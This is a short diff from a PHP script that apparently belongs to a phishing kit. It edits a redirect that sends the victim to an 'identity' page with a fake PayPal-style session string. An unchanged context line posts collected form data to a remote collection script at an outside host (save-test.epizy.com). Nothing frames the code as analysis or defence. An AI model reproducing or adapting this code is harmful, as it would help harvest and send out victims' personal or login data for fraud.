@@ -148,7 +148,7 @@ sendPost('http://www.save-test.epizy.com/sv3.php',$data);
 
 		
 	
-HEADER("Location: ../identity/identityc.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
+HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
 
 	
 
